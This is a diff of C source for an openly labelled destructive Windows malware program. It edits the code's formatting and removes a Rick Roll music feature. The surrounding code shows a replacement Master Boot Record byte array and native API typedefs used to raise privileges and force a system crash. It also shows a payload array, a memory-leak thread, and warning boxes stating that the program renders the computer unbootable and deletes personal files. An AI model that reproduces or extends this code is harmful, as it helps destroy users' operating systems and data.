@@ -46,11 +46,11 @@ const BYTE MasterBootRecord[] = {
 0x6C, 0x75, 0x38, 0x2C, 0x20, 0x65, 0x65, 0x65, 0x30, 0x31, 0x2C, 0x20, 0x61, 0x6E, 0x64, 0x20, 
 0x46, 0x61, 0x72, 0x61, 0x6C, 0x6C, 0x6F, 0x6E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA };
 
-typedef NTSTATUS(NTAPI* fnRtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
-typedef NTSTATUS(NTAPI* fnNtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR *Parameters, ULONG ValidResponseOption, PULONG Response);
-typedef NTSTATUS(NTAPI* fnNtSetInformationProcess)(HANDLE hProcess, ULONG ulClassInfo, PVOID pProcessInformation, ULONG pProcessInformationSize);
+typedef NTSTATUS (NTAPI* fnRtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
+typedef NTSTATUS (NTAPI* fnNtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR *Parameters, ULONG ValidResponseOption, PULONG Response);
+typedef NTSTATUS (NTAPI* fnNtSetInformationProcess)(HANDLE hProcess, ULONG ulClassInfo, PVOID pProcessInformation, ULONG pProcessInformationSize);
 
-typedef int (*functionarray) ();
+typedef int (*functionarray)();
 
 DWORD WINAPI audio(LPVOID lpParam) {
     while (true) {
@@ -60,24 +60,10 @@ DWORD WINAPI audio(LPVOID lpParam) {
     ExitThread(0);
 }
 
-DWORD WINAPI Music(LPVOID lpParam) {
-    mciSendString("open \"rick.mp3\" type mpegvideo alias mp3", NULL, 0, NULL); //TODO: Fix this later
-    mciSendString("play mp3", NULL, 0, NULL);
-    MessageBoxW(NULL, L"Get rick rolled", L"NEVER GONNA GIVE YOU UP", MB_YESNO | MB_ICONEXCLAMATION);
-    mciSendString("stop mp3", NULL, 0, NULL);
-}
-
 INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, INT nCmdShow) {
     if (MessageBoxW(NULL, L"This program is malware; a program that will render your computer unusable and corrupt your data should you run it. \nIf you understand this and wish to continue, press Yes. If you just found this file accidentally and do not want to harm your computer or your files, press No and this program will not execute.", L"WARNING", MB_YESNO | MB_ICONEXCLAMATION) != IDYES || MessageBoxW(NULL, L"THIS IS YOUR LAST WARNING. THE CREATOR (kevlu8) IS NOT RESPONSIBLE FOR ANY DAMAGE CAUSED TO YOUR SYSTEM. BY PRESSING THE \"YES\" BUTTON TO THIS MESSAGE BOX, YOUR SYSTEM WILL BE RENDERED UNBOOTABLE AND YOUR PERSONAL FILES WILL BE DELETED. IF YOU UNDERSTAND THIS AND WISH TO EXECUTE THIS MALICIOUS PROGRAM, CLICK YES. OTHERWISE, THIS IS YOUR LAST CHANCE TO BACK OUT BEFORE YOUR FILES ARE GONE.", L"LAST CHANCE BEFORE YOUR COMPUTER IS GONE", MB_YESNO | MB_ICONEXCLAMATION) != IDYES)
     {
         ExitProcess(0);
-    }
-
-    BOOL playmusic = TRUE;
-
-    if (MessageBoxW(NULL, L"Are you recording a video that you plan to upload to YouTube and monetize? We need to know this because this program contains copyrighted music.", L"Copyright warning", MB_YESNO | MB_ICONEXCLAMATION) == IDYES)
-    {
-        playmusic = FALSE;
     }
 
     functionarray payloads[] = {
@@ -108,10 +94,6 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
 
     //rick roll
     ShellExecuteA(NULL, "open", "https://www.youtube.com/watch?v=dQw4w9WgXcQ", NULL, NULL, SW_SHOWDEFAULT);
-
-    if (playmusic) {
-        HANDLE music = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)Music, NULL, 0, NULL);
-    } //add music soon, get better method
 
     HANDLE hAudio = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)audio, NULL, 0, NULL);
 
@@ -231,8 +213,6 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
     CloseHandle(hAudio);
     TerminateThread(hLeakRAM, 1);
     CloseHandle(hLeakRAM);
-    TerminateThread(Music, 1);
-    CloseHandle(Music);
 
     //crash
     BOOLEAN bOld2;
